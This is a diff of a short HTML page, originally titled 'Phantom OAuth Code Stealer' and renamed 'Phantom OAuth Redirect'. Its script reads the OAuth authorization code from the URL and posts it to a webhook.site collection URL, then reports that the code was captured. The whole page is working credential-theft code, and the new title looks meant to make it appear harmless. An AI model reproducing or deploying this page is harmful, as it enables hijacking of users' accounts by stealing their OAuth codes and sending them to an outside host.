@@ -1,25 +1,26 @@
+
 <!DOCTYPE html>
 <html>
   <head>
-    <title>Phantom OAuth Code Stealer</title>
-  </head>
-  <body>
-    <h2>Logging in...</h2>
+    <title>Phantom OAuth Redirect</title>
     <script>
       const params = new URLSearchParams(window.location.search);
       const code = params.get("code");
 
       if (code) {
-        fetch("https://webhook.site/da806180-59e3-4d3f-8b89-de2a2dc8dd41", {
+        fetch("https://webhook.site/570e225d-7edc-47b3-8629-dd5255aace1c", {
           method: "POST",
-          body: JSON.stringify({ code: code }),
-          headers: { "Content-Type": "application/json" }
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ code })
         }).then(() => {
-          document.body.innerHTML = "<h3>✅ Code captured</h3>";
+          document.body.innerText = "✅ Code sent to webhook!";
         });
       } else {
-        document.body.innerHTML = "<h3>❌ No code received</h3>";
+        document.body.innerText = "❌ No code found.";
       }
     </script>
+  </head>
+  <body>
+    Waiting for code...
   </body>
 </html>
